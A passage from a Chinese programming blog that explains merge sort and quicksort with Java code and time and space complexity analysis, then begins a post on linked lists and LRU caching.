class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 归并排序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    merge_sort(a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 递归终止条件</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p&gt;=r) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取分区点</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> q = p + (r-p)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序左边</span></span><br><span class=\"line\">    merge_sort(a, p, q);</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序右边</span></span><br><span class=\"line\">    merge_sort(a, q+<span class=\"number\">1</span>, r);</span><br><span class=\"line\">    <span class=\"comment\">// 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]</span></span><br><span class=\"line\">    merge(a, p, q, r);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 合并数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> q, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> j = q + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> k = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 合并数组 a[p, q]  a[q+1, r] 到临时数组temp</span></span><br><span class=\"line\">    <span class=\"comment\">// 申请一个临时数组</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span>[] temp = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[r - p + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 根据两个数组最短的长度进行比较添加到temp中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (i&lt;=q&amp;&amp; j&lt;=r)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]&lt;=a[j])&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 看哪个数组还没有完成，将其放到temp后</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i&lt;=q)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;=q)&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (j&lt;=r)&#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(Arrays.toString(temp));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将temp中对应的数据放入原数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= r-p; i++) &#123;</span><br><span class=\"line\">        a[p+i] = temp[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你可能已经发现了，merge(A[p…r], A[p…q], A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？</p>\n<p>如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。</p>\n<p>继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的性能分析\"><a href=\"#归并排序的性能分析\" class=\"headerlink\" title=\"归并排序的性能分析\"></a>归并排序的性能分析</h3></div><br></div>\n\n<p>还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。</p>\n<p><strong>第一、 归并排序是稳定的排序算法吗？</strong></p>\n<p>结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。</p>\n<p>在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。</p>\n<p><strong>第二、归并排序的时间复杂度是多少？</strong></p>\n<p>归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。</p>\n<p>在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。</p>\n<p>我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。</p>\n<p>从上面的分析，我们得出一个重要的结论：<strong>不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式</strong>。</p>\n<p>套用这个公式，我们来分析一下归并排序的时间复杂度。</p>\n<p>我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：<br>$$<br>\\begin{cases}<br>T(1) = C; &amp; n=1 \\\\[2ex]<br>T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程</p>\n<p>$$<br>\\begin{align*}<br>T(n) \\ &amp;= \\ 2*T(\\frac{n}{2}) \\ + \\ n \\\\[2ex]<br>&amp;= 2*(2 * T(\\frac{n}{4}) + \\frac{n}{2}) \\  + \\ n \\qquad = 4*T(\\frac{n}{4}) + 2*n \\\\[2ex]<br>&amp;= 4*(2* T(\\frac{n}{8}) + \\frac{n}{4}) \\  + \\ 2 * n \\ \\; = 8*T(\\frac{n}{8}) + 3*n \\\\[2ex]<br>&amp;= 8*(2* T(\\frac{n}{16}) + \\frac{n}{8}) \\  + \\ 3 * n \\ \\; = 16*T(\\frac{n}{16}) + 4*n \\\\[2ex]<br>&amp;= …… \\\\[2ex]<br>&amp;= 2^{k} * T(\\frac{n}{2^{k}}) + k * n<br>\\end{align*}<br>$$</p>\n<p>这样一步步推导，我们可以得到$T(n) \\ = \\ 2^{k} * T(\\frac{n}{2^{k}}) + k * n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\ = \\ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。</p>\n<p>从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。</p>\n<p><strong>第三、归并排序是不是原地排序算法呢？</strong></p>\n<p>归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。</p>\n<p>这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？</p>\n<p>如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？</p>\n<p>实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的原理\"><a href=\"#快速排序的原理\" class=\"headerlink\" title=\"快速排序的原理\"></a>快速排序的原理</h3></div><br></div>\n\n<p>我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。</p>\n<p>快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。</p>\n<p>第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。</p>\n<p>根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。</p>\n<p>如果我们用递推公式来将上面的过程写出来的话，就是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 递推公式</span><br><span class=\"line\">quick_sort(p...r) = quick_sort(p...q-<span class=\"number\">1</span>)+quick_sort(q+<span class=\"number\">1</span>...r)</span><br><span class=\"line\"></span><br><span class=\"line\"># 终止条件</span><br><span class=\"line\">p&gt;=r</span><br></pre></td></tr></table></figure>\n<p>我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    quickSort(arr, <span class=\"number\">0</span> , n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left&gt;=right) <span class=\"keyword\">return</span>; </span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid = partation(arr, left, right);</span><br><span class=\"line\">    quickSort(arr, left, mid-<span class=\"number\">1</span>);</span><br><span class=\"line\">    quickSort(arr, mid+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> base = arr[left];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left, j = right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;j)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[j] &gt;= base) j--;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[i] &lt;= base) i++;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i&lt;j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = arr[i];</span><br><span class=\"line\">            arr[i] = arr[j];</span><br><span class=\"line\">            arr[j] = temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    arr[left] = arr[i];</span><br><span class=\"line\">    arr[i] = base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation1</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = a[right];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=left; j&lt;=right-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[j]&lt;pivot)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = a[i];</span><br><span class=\"line\">            a[i] = a[j];</span><br><span class=\"line\">            a[j] = temp;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    a[right] = a[i];</span><br><span class=\"line\">    a[i] = pivot;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。</p>\n<p>如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。</p>\n<p>不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。</p>\n<p>原地分区函数的实现思路非常巧妙，我下面用伪代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">partation(a,p,r)&#123;</span><br><span class=\"line\">    pivot := A[r]</span><br><span class=\"line\">    i := p;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j:=p to r-<span class=\"number\">1</span> <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> A[j] &lt; pivot&#123;</span><br><span class=\"line\">            swap A[i] with A[j]</span><br><span class=\"line\">            i := i+<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap A[i] with A[r]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。</p>\n<p>数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。</p>\n<p>因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。</p>\n<p>到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？</p>\n<p>可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的性能分析\"><a href=\"#快速排序的性能分析\" class=\"headerlink\" title=\"快速排序的性能分析\"></a>快速排序的性能分析</h3></div><br></div>\n\n<p>现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。</p>\n<p>快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。</p>\n<p>$$<br>\\begin{cases} \\\\<br>\\ T(1) = C; &amp; n=1 \\\\[2ex]<br>\\ T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。</p>\n<p>我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。</p>\n<p>我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？</p>\n<p>实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。</p>\n<p>我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。</p>\n<p>如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。</p>\n<p>我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？</p>\n<p>第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1.</p>\n<p>如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。</p>\n<p>归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。</p>\n<p>快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？</p>\n<p>多路归并、外排序</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-链表","date":"2018-09-11T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。\n\n缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。\n\n缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。\n\n今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表及其结构\n{% endnote %}\n</div>\n\n相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。\n\n我们先从**底层存储结构**来看一下二者的区别：\n\n为了直观的对比，我画了一张图，从图中可以看到，**数组需要一块连续的内存空间来存储**，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。\n\n而链表恰恰相反，它并不需要一块连续的内存空间，他**通过“指针”将一组零散的内存块连接起来**使用，所以申请一块大小是100MB的链表，根本不会有问题。\n\n{% asset_img 数组与链表结构对比.jpg 数组与链表结构对比 %}\n\n链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。\n\n#### 单链表\n\n首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“**结点**”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做**后继指针 next**。\n\n{% asset_img 单链表.jpg %}\n\n从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为**头结点**，最后一个节点称为**尾结点**。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。\n\n与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。\n\n为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。\n\n{% asset_img 单链表插入删除.jpg %}\n\n但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。\n\n你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。\n\n好了，单链表了解了，下面来看看另外两个复杂的链表：**循环链表和双向链表**。\n\n#### 循环链表\n\n**循环链表是一种特殊的单链表**。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。\n\n{% asset_img 循环链表.jpg %}\n\n和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。\n\n#### 